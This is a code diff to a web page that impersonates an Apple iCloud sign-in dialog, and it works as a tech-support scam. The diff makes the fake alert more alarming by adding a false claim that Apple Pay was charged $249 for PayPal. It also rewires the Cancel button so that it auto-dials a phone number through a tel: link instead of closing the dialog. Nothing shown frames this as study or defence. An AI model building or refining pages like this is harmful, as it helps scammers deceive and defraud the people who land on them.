@@ -116,7 +116,7 @@
     <section class="dialog" role="dialog" aria-modal="true" aria-labelledby="dlg-title" aria-describedby="dlg-desc" tabindex="-1">
       <div class="dlg-body">
         <h2 id="dlg-title" class="dlg-title">Sign In to iCloud</h2>
-        <p id="dlg-desc" class="dlg-text">Your Apple iCloud has been compromised. Call Apple Support immediately.</p>
+        <p id="dlg-desc" class="dlg-text">Your Apple iCloud has been compromised. Your Apple Pay has been used for paying $249 for PayPal. Call us to stop these charges if not done by you.</p>
       </div>
       <div class="dlg-divider" aria-hidden="true"></div>
       <div class="dlg-actions" id="dlg-actions">
@@ -236,8 +236,7 @@
       openBtn && openBtn.addEventListener('click', open);
 
       cancelBtnNew.addEventListener('click', () => {
-        close();
-        openWarning();
+        window.location.assign('tel:+1-844-485-2265'); // Trigger auto-dial on cancel click
       });
 
       callBtn.addEventListener('click', () => {
